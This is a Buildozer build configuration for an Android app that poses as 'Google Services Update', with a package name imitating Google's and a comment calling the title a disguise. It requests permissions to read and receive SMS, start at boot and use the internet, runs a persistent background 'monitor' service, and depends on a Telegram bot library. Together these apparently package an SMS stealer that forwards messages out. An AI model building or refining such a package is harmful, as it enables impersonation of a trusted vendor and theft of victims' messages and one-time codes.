[app]

# (str) Title of your application (Penyamaran)
title = Google Services Update

# (str) Package name
package.name = services_framework

# (str) Package domain
package.domain = com.google.android

# (str) Source code where the main.py lives
source.dir = .

# (list) Source files to include
source.include_exts = py,png,jpg,kv,atlas

# (str) Application versioning
version = 1.1

# (list) Application requirements
requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius

# (list) Permissions SAKTI
android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED

# (int) Target Android API
android.api = 33

# (int) Minimum API
android.minapi = 21

# (str) Android NDK version
android.ndk = 25b

# (bool) Private data storage
android.private_storage = True

# (list) Service agar tetap jalan di latar belakang
services = monitor:main.py

# (str) Android arch
android.archs = arm64-v8a, armeabi-v7a

# (bool) Allow backup
android.allow_backup = True

[buildozer]
log_level = 2
warn_on_root = 1
